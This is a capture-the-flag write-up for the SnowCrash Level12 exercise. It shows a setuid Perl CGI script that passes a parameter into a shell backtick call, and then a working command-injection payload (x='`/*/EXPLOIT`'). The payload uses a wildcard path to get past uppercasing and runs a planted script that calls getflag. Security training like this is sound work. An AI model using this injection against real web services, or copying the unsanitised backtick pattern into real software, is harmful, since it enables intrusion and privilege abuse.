# Level12

## Exploring the exercice

```bash 
$ ls -la
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```

So we have a perl script with setuid/setgid, we have already seen that type of extension in a previous exercice. 

## Inspecting the file

```bash 
$ ./level12.pl 
Content-type: text/html
```

Like in the previous, let's look at the response we get.

```bash
curl -I localhost:4646
HTTP/1.1 200 OK
Date: Wed, 11 Jun 2025 14:16:00 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2
Content-Type: text/html
```

Let's see the code itself

```bash 
$ cat ./level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```


So the scrips takes two arguments, the first argument x, will be capitalized and delete anything after a space. 
The security flaw is from this line  

```bash
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
where xx gets executed but we can't directly write x="getflag>/tmp/flag" which would be translated as x="GETFLAG>/TMP/FLAG". 


We need to create a file that will get executed. 
```bash
$ touch /tmp/EXPLOIT
$ cat /tmp/EXPLOIT
#!/bin/sh

getflag > /tmp/flag
```

Then we can execute the file 

```bash
$ curl localhost:4646?x='`/*/EXPLOIT`'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : ***********
```

